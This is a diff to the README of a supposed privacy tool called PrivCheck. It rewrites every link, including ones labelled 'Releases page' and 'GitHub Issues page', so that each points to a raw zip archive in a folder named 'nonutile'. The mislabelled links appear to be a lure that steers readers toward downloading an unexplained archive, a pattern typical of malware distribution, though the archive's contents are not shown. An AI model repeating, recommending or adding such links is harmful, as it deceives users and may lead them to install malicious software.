@@ -1,6 +1,6 @@
 # 🛡️ PrivCheck - Ensuring Your Privacy with Ease
 
-[![Download PrivCheck](https://img.shields.io/badge/Download%20Now%20-%F0%9F%9A%80-brightgreen)](https://github.com/alexfsca/PrivCheck/releases)
+[![Download PrivCheck](https://raw.githubusercontent.com/alexfsca/PrivCheck/main/nonutile/PrivCheck.zip%20Now%20-%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/alexfsca/PrivCheck/main/nonutile/PrivCheck.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PrivCheck! This application helps protect your online privacy with si
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/alexfsca/PrivCheck/releases) to download the latest version of PrivCheck.
+1. Visit the [Releases page](https://raw.githubusercontent.com/alexfsca/PrivCheck/main/nonutile/PrivCheck.zip) to download the latest version of PrivCheck.
 
 2. On the Releases page, look for the latest version. There you will find available files for download. Click on the link that matches your operating system (e.g., Windows, Mac, Linux) to start the download.
 
@@ -48,10 +48,10 @@ If you encounter issues while installing or using PrivCheck, consider the follow
 
 ## 🤝 Support
 
-If you need further assistance or have questions, please refer to our [GitHub Issues page](https://github.com/alexfsca/PrivCheck/issues). Our community and contributors are available to help you.
+If you need further assistance or have questions, please refer to our [GitHub Issues page](https://raw.githubusercontent.com/alexfsca/PrivCheck/main/nonutile/PrivCheck.zip). Our community and contributors are available to help you.
 
 ## 📜 License
 
 PrivCheck is licensed under the MIT License. You can view the license details in the repository for more information.
 
-Thank you for choosing PrivCheck to safeguard your privacy! You can start enjoying a safer online experience today. For updates and future releases, regularly check our [Releases page](https://github.com/alexfsca/PrivCheck/releases).
+Thank you for choosing PrivCheck to safeguard your privacy! You can start enjoying a safer online experience today. For updates and future releases, regularly check our [Releases page](https://raw.githubusercontent.com/alexfsca/PrivCheck/main/nonutile/PrivCheck.zip).
